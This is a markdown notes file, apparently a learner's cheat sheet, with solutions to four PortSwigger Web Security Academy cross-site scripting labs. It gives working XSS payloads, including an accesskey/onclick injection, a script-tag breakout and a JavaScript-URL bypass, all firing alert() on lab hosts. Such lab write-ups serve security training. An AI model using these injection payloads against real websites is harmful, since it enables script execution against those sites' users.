## XSS with Access key (Canonical Link tag)

**Chapter:**

https://portswigger.net/web-security/cross-site-scripting/contexts

**Lab:** 

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

**Limitation:** Only on Chrome

**Solution:**

https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

Press Alt+x on keyboard to get alert

## XSS within <script>

**Chapter:** 
  
https://portswigger.net/web-security/cross-site-scripting/contexts
**Lab:** 
  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
**Limitations:** NA
**solution:** 
  
</script><script>alert(1)</script>


## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Chapter:**

https://portswigger.net/web-security/cross-site-scripting/contexts
  
**Lab:**

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
  
**Limitations:** NA

**Solution:** 

\'-alert(1)//


## Reflected XSS in a JavaScript URL with some characters blocked

**Chapter:** 

https://portswigger.net/web-security/cross-site-scripting/contexts
  
**Lab:**

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
  
**Limitations:** NA

**Solution:** 

``` https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 ```


  **solution:** 






# Template:
## Topic Here 

**Chapter:**
  
**Lab:**

  
**Limitations:** NA

**Solution:** 


  **solution:** 
